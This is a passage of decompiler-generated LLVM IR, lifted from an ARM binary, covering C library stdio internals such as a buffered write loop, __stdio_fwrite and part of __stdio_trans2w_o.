  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_13dac2 = icmp eq i32 %arg3, 0
  store i1 %v2_13dac2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_13dac2, label %dec_label_pc_13e4c, label %dec_label_pc_13db8

dec_label_pc_13dacthread-pre-split:               ; preds = %bb22
  %v3_13dd0 = load i32, i32* %r7.global-to-local, align 4
  %v5_13dd0 = add i32 %v3_13dd0, %v4_13dc4
  store i32 %v5_13dd0, i32* %r7.global-to-local, align 4
  %v5_13dd4 = sub i32 %v0_13dcc, %v4_13dc4
  store i32 %v5_13dd4, i32* %r5.global-to-local, align 4
  %v2_13dac = icmp eq i32 %v5_13dd4, 0
  store i1 %v2_13dac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13dd4, i32* @r2, align 4
  br i1 %v2_13dac, label %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge, label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %entry, %dec_label_pc_13dacthread-pre-split
  %v0_13dbc = phi i32 [ %v5_13dd0, %dec_label_pc_13dacthread-pre-split ], [ %arg2, %entry ]
  %v0_13db8.in = phi i32 [ %v5_13dd4, %dec_label_pc_13dacthread-pre-split ], [ %arg3, %entry ]
  %v0_13db8 = icmp slt i32 %v0_13db8.in, 0
  br i1 %v0_13db8, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_13db8
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_13db8, %bb
  %v0_13dc0 = load i32, i32* @r4, align 4
  %v1_13dc0 = add i32 %v0_13dc0, 4
  %v2_13dc0 = inttoptr i32 %v1_13dc0 to i32*
  %v3_13dc0 = load i32, i32* %v2_13dc0, align 4
  store i32 %v3_13dc0, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_13dbc to i32*
  %v4_13dc4 = call i32 @__libc_write(i32 %v3_13dc0, i32* %tmp23)
  store i32 %v4_13dc4, i32* %r0.global-to-local, align 4
  %v1_13dc8 = icmp slt i32 %v4_13dc4, 0
  %v2_13dc8 = icmp eq i32 %v4_13dc4, 0
  store i1 %v2_13dc8, i1* %cpsr_z.global-to-local, align 1
  %v0_13dcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13dcc, i32* %r6.global-to-local, align 4
  br i1 %v1_13dc8, label %dec_label_pc_13ddc, label %dec_label_pc_13dacthread-pre-split

dec_label_pc_13ddc:                               ; preds = %bb22
  %v0_13ddc = load i32, i32* @r4, align 4
  %v1_13ddc = inttoptr i32 %v0_13ddc to i32*
  %v2_13ddc = load i32, i32* %v1_13ddc, align 4
  store i32 %v2_13ddc, i32* %r3.global-to-local, align 4
  %v1_13de0 = add i32 %v0_13ddc, 8
  store i32 %v1_13de0, i32* %r0.global-to-local, align 4
  %v1_13de4 = inttoptr i32 %v1_13de0 to i32*
  %v2_13de4 = load i32, i32* %v1_13de4, align 4
  store i32 %v2_13de4, i32* %r0.global-to-local, align 4
  %v3_13de4 = add i32 %v0_13ddc, 12
  %v4_13de4 = inttoptr i32 %v3_13de4 to i32*
  %v5_13de4 = load i32, i32* %v4_13de4, align 4
  %v1_13de8 = or i32 %v2_13ddc, 8
  store i32 %v1_13de8, i32* %r3.global-to-local, align 4
  %v3_13dec = sdiv i32 %v2_13ddc, 256
  %v2_13df0 = sub i32 %v5_13de4, %v2_13de4
  store i32 %v2_13df0, i32* %r2.global-to-local, align 4
  %v9_13df0 = icmp eq i32 %v5_13de4, %v2_13de4
  store i1 %v9_13df0, i1* %cpsr_z.global-to-local, align 1
  %v1_13df4 = trunc i32 %v3_13dec to i8
  %v3_13df4 = add i32 %v0_13ddc, 1
  %v4_13df4 = inttoptr i32 %v3_13df4 to i8*
  store i8 %v1_13df4, i8* %v4_13df4, align 1
  %v0_13df8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13df8 = trunc i32 %v0_13df8 to i8
  %v2_13df8 = load i32, i32* @r4, align 4
  %v3_13df8 = inttoptr i32 %v2_13df8 to i8*
  store i8 %v1_13df8, i8* %v3_13df8, align 1
  %v0_13dfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13dfc, label %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge, label %dec_label_pc_13e00

dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge:  ; preds = %dec_label_pc_13ddc
  %v0_13e48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13ddc
  %v0_13e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e00 = load i32, i32* %r5.global-to-local, align 4
  %v9_13e00 = icmp eq i32 %v0_13e00, %v1_13e00
  store i1 %v9_13e00, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_13e00, %v1_13e00
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_13e00
  store i32 %v0_13e00, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_13e00, %bb24
  %v0_13e08.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13e0c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_13e2c
  %v2_13e0c = phi i32 [ %v2_13e0c.pre, %.preheader ], [ %v1_13e30, %dec_label_pc_13e2c ]
  %v0_13e08 = phi i32 [ %v0_13e08.pre, %.preheader ], [ %v1_13e18, %dec_label_pc_13e2c ]
  %v1_13e08 = inttoptr i32 %v0_13e08 to i8*
  %v2_13e08 = load i8, i8* %v1_13e08, align 1
  %v3_13e08 = zext i8 %v2_13e08 to i32
  store i32 %v3_13e08, i32* %r3.global-to-local, align 4
  %v3_13e0c = inttoptr i32 %v2_13e0c to i8*
  store i8 %v2_13e08, i8* %v3_13e0c, align 1
  %v0_13e10 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e10 = inttoptr i32 %v0_13e10 to i8*
  %v2_13e10 = load i8, i8* %v1_13e10, align 1
  %v3_13e10 = zext i8 %v2_13e10 to i32
  store i32 %v3_13e10, i32* %r3.global-to-local, align 4
  %v7_13e14 = icmp eq i8 %v2_13e10, 10
  store i1 %v7_13e14, i1* %cpsr_z.global-to-local, align 1
  %v0_13e18 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e18 = add i32 %v0_13e18, 1
  store i32 %v1_13e18, i32* %r7.global-to-local, align 4
  br i1 %v7_13e14, label %dec_label_pc_13e20, label %dec_label_pc_13e2c

dec_label_pc_13e20:                               ; preds = %bb25
  %v0_13e20 = load i32, i32* @r4, align 4
  %v1_13e20 = add i32 %v0_13e20, 1
  %v2_13e20 = inttoptr i32 %v1_13e20 to i8*
  %v3_13e20 = load i8, i8* %v2_13e20, align 1
  %v4_13e20 = zext i8 %v3_13e20 to i32
  store i32 %v4_13e20, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_13e20, 2
  %v2_13e24 = icmp eq i8 %tmp30, 0
  store i1 %v2_13e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e24, label %dec_label_pc_13e2c, label %dec_label_pc_13e38

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e20, %bb25
  %v0_13e2c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e2c = add i32 %v0_13e2c, -1
  store i32 %v1_13e2c, i32* %r6.global-to-local, align 4
  %v7_13e2c = icmp eq i32 %v0_13e2c, 1
  store i1 %v7_13e2c, i1* %cpsr_z.global-to-local, align 1
  %v1_13e30 = add i32 %v0_13e10, 1
  store i32 %v1_13e30, i32* %r0.global-to-local, align 4
  br i1 %v7_13e2c, label %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge, label %bb25

dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge:  ; preds = %dec_label_pc_13e2c
  %v0_13e38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e38

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e20, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge
  %v0_13e3c = phi i32 [ %v1_13e30, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge ], [ %v0_13e10, %dec_label_pc_13e20 ]
  %v0_13e38 = phi i32 [ %v0_13e38.pre, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge ], [ %v0_13e20, %dec_label_pc_13e20 ]
  %v1_13e38 = add i32 %v0_13e38, 8
  %v2_13e38 = inttoptr i32 %v1_13e38 to i32*
  %v3_13e38 = load i32, i32* %v2_13e38, align 4
  store i32 %v3_13e38, i32* %r3.global-to-local, align 4
  %v2_13e3c = add i32 %v0_13e38, 16
  %v3_13e3c = inttoptr i32 %v2_13e3c to i32*
  store i32 %v0_13e3c, i32* %v3_13e3c, align 4
  %v0_13e40 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e40 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e40 = sub i32 %v1_13e40, %v0_13e40
  store i32 %v2_13e40, i32* %r3.global-to-local, align 4
  %v1_13e44 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e44 = sub i32 %v1_13e44, %v2_13e40
  store i32 %v2_13e44, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge, %dec_label_pc_13e38
  %v0_13e48 = phi i32 [ %v0_13e48.pre, %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge ], [ %v2_13e44, %dec_label_pc_13e38 ]
  %v1_13e48 = load i32, i32* %r8.global-to-local, align 4
  %v2_13e48 = sub i32 %v1_13e48, %v0_13e48
  store i32 %v2_13e48, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge: ; preds = %dec_label_pc_13dacthread-pre-split
  %v0_13e4c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %entry, %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge, %dec_label_pc_13e48
  %v0_13e4c = phi i32 [ %v2_13e48, %dec_label_pc_13e48 ], [ %v0_13e4c.pre.pre, %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_13e4c, i32* %r0.global-to-local, align 4
  ret i32 %v0_13e4c

; uselistorder directives
  uselistorder i32 %v0_13e4c, { 1, 0 }
  uselistorder i32 %v0_13e38, { 1, 0 }
  uselistorder i32 %v1_13e30, { 0, 2, 1 }
  uselistorder i32 %v0_13e2c, { 1, 0 }
  uselistorder i1 %v2_13e24, { 1, 0 }
  uselistorder i32 %v1_13e18, { 1, 0 }
  uselistorder i32 %v0_13e00, { 1, 0, 2 }
  uselistorder i32 %v5_13de4, { 1, 0 }
  uselistorder i32 %v2_13de4, { 1, 0, 2 }
  uselistorder i32 %v0_13dcc, { 1, 0 }
  uselistorder i32 %v4_13dc4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_13dd4, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13e48, { 1, 0 }
  uselistorder label %dec_label_pc_13e38, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_13db8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13e54 = load i32, i32* @r4, align 4
  store i32 %v3_13e54, i32* %stack_var_-20, align 4
  %v6_13e54 = load i32, i32* @r5, align 4
  %v9_13e54 = load i32, i32* @r6, align 4
  %v12_13e54 = load i32, i32* @r7, align 4
  %v15_13e54 = load i32, i32* @lr, align 4
  %v1_13e58 = add i32 %arg3, 1
  %v2_13e58 = inttoptr i32 %v1_13e58 to i8*
  %v3_13e58 = load i8, i8* %v2_13e58, align 1
  %v4_13e58 = zext i8 %v3_13e58 to i32
  %v3_13e5c = mul nuw nsw i32 %v4_13e58, 256
  %v1_13e60 = and i32 %v3_13e5c, 512
  store i32 %v1_13e60, i32* @r4, align 4
  %v2_13e60 = icmp eq i32 %v1_13e60, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13e60, label %dec_label_pc_13e74, label %dec_label_pc_13f70

dec_label_pc_13e74:                               ; preds = %entry
  %v1_13e74 = add i32 %arg3, 4
  %v2_13e74 = inttoptr i32 %v1_13e74 to i32*
  %v3_13e74 = load i32, i32* %v2_13e74, align 4
  %v1_13e7c = add i32 %arg3, 16
  %v2_13e7c = inttoptr i32 %v1_13e7c to i32*
  %v3_13e7c = load i32, i32* %v2_13e7c, align 4
  store i32 %v3_13e7c, i32* @r0, align 4
  %v1_13e80 = add i32 %arg3, 12
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  %v3_13e80 = load i32, i32* %v2_13e80, align 4
  %v4_13e84 = icmp eq i32 %v3_13e74, -2
  %v2_13e88 = sub i32 %v3_13e80, %v3_13e7c
  br i1 %v4_13e84, label %dec_label_pc_13e88, label %dec_label_pc_13eb0

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e74
  %v3_13e8c = icmp ugt i32 %v2_13e88, %arg2
  br i1 %v3_13e8c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_13e88
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_13e88, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13e88, %dec_label_pc_13e88 ]
  %v0_13e94 = phi i32 [ %arg2, %bb ], [ %v2_13e88, %dec_label_pc_13e88 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13e94, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13e9c = call i32 @memcpy()
  %v0_13ea0 = load i32, i32* @r5, align 4
  %v1_13ea0 = add i32 %v0_13ea0, 16
  %v2_13ea0 = inttoptr i32 %v1_13ea0 to i32*
  %v3_13ea0 = load i32, i32* %v2_13ea0, align 4
  %v1_13ea4 = load i32, i32* @r4, align 4
  %v2_13ea4 = add i32 %v1_13ea4, %v3_13ea0
  store i32 %v2_13ea4, i32* %v2_13ea0, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13e74
  %tmp = icmp ult i32 %v2_13e88, %arg2
  br i1 %tmp, label %dec_label_pc_13f50, label %dec_label_pc_13ebc

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13eb0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13ec4 = call i32 @memcpy()
  %v0_13ec8 = load i32, i32* @r5, align 4
  %v1_13ec8 = add i32 %v0_13ec8, 16
  %v2_13ec8 = inttoptr i32 %v1_13ec8 to i32*
  %v3_13ec8 = load i32, i32* %v2_13ec8, align 4
  %v1_13ecc = add i32 %v0_13ec8, 1
  %v2_13ecc = inttoptr i32 %v1_13ecc to i8*
  %v3_13ecc = load i8, i8* %v2_13ecc, align 1
  %v1_13ed0 = load i32, i32* @r6, align 4
  %v2_13ed0 = add i32 %v1_13ed0, %v3_13ec8
  %tmp17 = urem i8 %v3_13ecc, 2
  %v2_13ed4 = icmp eq i8 %tmp17, 0
  store i32 %v2_13ed0, i32* %v2_13ec8, align 4
  br i1 %v2_13ed4, label %dec_label_pc_13f84, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ebc
  %v0_13ee0 = load i32, i32* %r7.global-to-local, align 4
  %v0_13ee8 = load i32, i32* @r6, align 4
  %v4_13eec = call i32 @memrchr(i32 %v0_13ee0, i32 10, i32 %v0_13ee8, i32 %v2_13ed0)
  %v2_13ef0 = icmp eq i32 %v4_13eec, 0
  br i1 %v2_13ef0, label %dec_label_pc_13f84, label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ee0
  %v0_13ef8 = load i32, i32* @r5, align 4
  store i32 %v0_13ef8, i32* @r0, align 4
  %v0_13efc = call i32 @__stdio_wcommit()
  %v2_13f00 = icmp eq i32 %v0_13efc, 0
  br i1 %v2_13f00, label %dec_label_pc_13f84, label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13ef8
  %v0_13f08 = load i32, i32* @r6, align 4
  %v3_13f08 = icmp uge i32 %v0_13f08, %v0_13efc
  %v0_13efc.v0_13f08 = select i1 %v3_13f08, i32 %v0_13efc, i32 %v0_13f08
  store i32 %v0_13efc.v0_13f08, i32* @r4, align 4
  %v2_13f14 = sub i32 %v0_13f08, %v0_13efc.v0_13f08
  %v0_13f18 = load i32, i32* %r7.global-to-local, align 4
  %v2_13f18 = add i32 %v0_13f18, %v2_13f14
  store i32 %v2_13f18, i32* %r7.global-to-local, align 4
  store i32 %v0_13efc.v0_13f08, i32* @r2, align 4
  %v4_13f28 = call i32 @__GI_memchr(i32 %v2_13f18, i32 10, i32 %v0_13efc.v0_13f08, i32 %v2_13f14)
  %v2_13f2c = icmp eq i32 %v4_13f28, 0
  br i1 %v2_13f2c, label %dec_label_pc_13f84, label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f08
  %v0_13f34 = load i32, i32* @r5, align 4
  %v1_13f34 = add i32 %v0_13f34, 16
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  %v0_13f38 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f38 = load i32, i32* @r4, align 4
  %v2_13f38 = sub i32 %v0_13f38, %v4_13f28
  %v2_13f3c = add i32 %v2_13f38, %v1_13f38
  %v2_13f40 = sub i32 %v3_13f34, %v2_13f3c
  %v1_13f44 = load i32, i32* @r6, align 4
  %v2_13f44 = sub i32 %v1_13f44, %v2_13f3c
  store i32 %v2_13f44, i32* @r6, align 4
  store i32 %v2_13f40, i32* %v2_13f34, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13eb0
  %v1_13f50 = add i32 %arg3, 8
  %v2_13f50 = inttoptr i32 %v1_13f50 to i32*
  %v3_13f50 = load i32, i32* %v2_13f50, align 4
  %v9_13f54 = icmp eq i32 %v3_13e7c, %v3_13f50
  br i1 %v9_13f54, label %dec_label_pc_13f70, label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f50
  store i32 %arg3, i32* @r0, align 4
  %v0_13f60 = call i32 @__stdio_wcommit()
  %v2_13f64 = icmp eq i32 %v0_13f60, 0
  br i1 %v2_13f64, label %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge, label %bb13

dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge:  ; preds = %dec_label_pc_13f5c
  %v0_13f78.pre = load i32, i32* @r6, align 4
  %v0_13f70.pre = load i32, i32* @r5, align 4
  %v0_13f74.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13f7c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_13f70

bb13:                                             ; preds = %dec_label_pc_13f5c
  %v1_13f68 = load i32, i32* @r4, align 4
  store i32 %v1_13f68, i32* @r6, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge, %entry, %dec_label_pc_13f50
  %v2_13f7c = phi i32 [ %v2_13f7c.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %v3_13e54, %entry ], [ %v3_13e54, %dec_label_pc_13f50 ]
  %v0_13f74 = phi i32 [ %v0_13f74.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_13f50 ]
  %v0_13f70 = phi i32 [ %v0_13f70.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_13f50 ]
  %v0_13f78 = phi i32 [ %v0_13f78.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_13f50 ]
  store i32 %v2_13f7c, i32* @r4, align 4
  store i32 %v9_13e54, i32* @r6, align 4
  store i32 %v15_13e54, i32* @lr, align 4
  %v3_13f80 = inttoptr i32 %v0_13f70 to i8*
  %v4_13f80 = call i32 @__stdio_WRITE(i8* %v3_13f80, i32 %v0_13f74, i32 %v0_13f78)
  br label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %bb13, %dec_label_pc_13f08, %dec_label_pc_13ef8, %dec_label_pc_13ee0, %dec_label_pc_13ebc, %dec_label_pc_13f34, %bb10, %dec_label_pc_13f70
  %v0_13f84 = load i32, i32* @r6, align 4
  %v2_13f88 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f88, i32* @r4, align 4
  store i32 %v6_13e54, i32* @r5, align 4
  store i32 %v9_13e54, i32* @r6, align 4
  store i32 %v12_13e54, i32* @r7, align 4
  ret i32 %v0_13f84

; uselistorder directives
  uselistorder i32 %v2_13f3c, { 1, 0 }
  uselistorder i32 %v2_13f14, { 1, 0 }
  uselistorder i32 %v0_13efc.v0_13f08, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13f08, { 1, 0, 2 }
  uselistorder i32 %v2_13e88, { 2, 0, 1, 3 }
  uselistorder i32 %v9_13e54, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 7, 6, 8, 3, 5 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13f84, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_13f70, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f8c = load i32, i32* @r4, align 4
  store i32 %v3_13f8c, i32* %stack_var_-8, align 4
  %v3_13f90 = load i8, i8* %arg1, align 1
  %v4_13f90 = zext i8 %v3_13f90 to i32
  store i32 %v4_13f90, i32* %r2.global-to-local, align 4
  %v2_13f94 = add i32 %tmp, 1
  %v3_13f94 = inttoptr i32 %v2_13f94 to i8*
  %v4_13f94 = load i8, i8* %v3_13f94, align 1
  %v5_13f94 = zext i8 %v4_13f94 to i32
  store i32 %v5_13f94, i32* %r3.global-to-local, align 4
  %v4_13f98 = mul nuw nsw i32 %v5_13f94, 256
  %v5_13f98 = or i32 %v4_13f98, %v4_13f90
  store i32 %v5_13f98, i32* %r2.global-to-local, align 4
  %v2_13f9c = and i32 %v5_13f98, %arg2
  %v4_13f9c = icmp eq i32 %v2_13f9c, 0
  store i1 %v4_13f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_13f9c, label %dec_label_pc_13fa8, label %dec_label_pc_13fc0

dec_label_pc_13fa8:                               ; preds = %entry
  %v1_13fa8 = and i32 %v5_13f98, 2176
  %v2_13fa8 = icmp eq i32 %v1_13fa8, 0
  store i1 %v2_13fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fa8, label %dec_label_pc_13fb0, label %dec_label_pc_13fd4

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13fa8
  %v2_13fb0 = or i32 %v5_13f98, %arg2
  store i32 %v2_13fb0, i32* %r2.global-to-local, align 4
  %v3_13fb4 = sdiv i32 %v2_13fb0, 256
  store i32 %v3_13fb4, i32* %r3.global-to-local, align 4
  %v1_13fb8 = trunc i32 %v3_13fb4 to i8
  store i8 %v1_13fb8, i8* %v3_13f94, align 1
  %v0_13fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_13fbc = trunc i32 %v0_13fbc to i8
  store i8 %v1_13fbc, i8* %arg1, align 1
  %v0_13fc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %entry, %dec_label_pc_13fb0
  %v0_1400c = phi i32 [ %tmp, %entry ], [ %v0_13fc0.pre, %dec_label_pc_13fb0 ]
  %v1_13fc0 = inttoptr i32 %v0_1400c to i8*
  %v2_13fc0 = load i8, i8* %v1_13fc0, align 1
  %v3_13fc0 = zext i8 %v2_13fc0 to i32
  store i32 %v3_13fc0, i32* %r2.global-to-local, align 4
  %v1_13fc4 = add i32 %v0_1400c, 1
  %v2_13fc4 = inttoptr i32 %v1_13fc4 to i8*
  %v3_13fc4 = load i8, i8* %v2_13fc4, align 1
  %v4_13fc4 = zext i8 %v3_13fc4 to i32
  store i32 %v4_13fc4, i32* %r3.global-to-local, align 4
  %v4_13fc8 = mul nuw nsw i32 %v4_13fc4, 256
  %v1_13fcc = and i32 %v3_13fc0, 32
  %v2_13fcc = icmp eq i32 %v1_13fcc, 0
  store i1 %v2_13fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fcc, label %dec_label_pc_13ffc, label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fa8, %dec_label_pc_13fc0
  %v0_13fd4 = call i32 @__errno_location()
  store i32 %v0_13fd4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_13fdc = inttoptr i32 %v0_13fd4 to i32*
  store i32 9, i32* %v2_13fdc, align 4
  br label %dec_label_pc_13fe0

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_14024, %dec_label_pc_13fd4
  %v0_13fe0 = load i32, i32* @r4, align 4
  %v1_13fe0 = inttoptr i32 %v0_13fe0 to i32*
  %v2_13fe0 = load i32, i32* %v1_13fe0, align 4
  %v1_13fe4 = or i32 %v2_13fe0, 8
  store i32 %v1_13fe4, i32* %r3.global-to-local, align 4
  %v3_13fe8 = sdiv i32 %v2_13fe0, 256
  store i32 %v3_13fe8, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_13ff0 = trunc i32 %v3_13fe8 to i8
  %v3_13ff0 = add i32 %v0_13fe0, 1
  %v4_13ff0 = inttoptr i32 %v3_13ff0 to i8*
  store i8 %v1_13ff0, i8* %v4_13ff0, align 1
  %v0_13ff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ff4 = trunc i32 %v0_13ff4 to i8
  %v2_13ff4 = load i32, i32* @r4, align 4
  %v3_13ff4 = inttoptr i32 %v2_13ff4 to i8*
  store i8 %v1_13ff4, i8* %v3_13ff4, align 1
  %v2_13ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ff8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_13ffc:                               ; preds = %dec_label_pc_13fc0
  %tmp15 = urem i8 %v2_13fc0, 4
  %v2_13ffc = icmp eq i8 %tmp15, 0
  store i1 %v2_13ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ffc, label %dec_label_pc_14060, label %dec_label_pc_14004

dec_label_pc_14004:                               ; preds = %dec_label_pc_13ffc
  %v1_14004 = and i32 %v3_13fc0, 4
  store i32 %v1_14004, i32* @r1, align 4
  %v2_14004 = icmp eq i32 %v1_14004, 0
  store i1 %v2_14004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14004, label %dec_label_pc_1400c, label %dec_label_pc_1403c

dec_label_pc_1400c:                               ; preds = %dec_label_pc_14004
  %v1_1400c = add i32 %v0_1400c, 20
  %v2_1400c = inttoptr i32 %v1_1400c to i32*
  %v3_1400c = load i32, i32* %v2_1400c, align 4
  store i32 %v3_1400c, i32* %r2.global-to-local, align 4
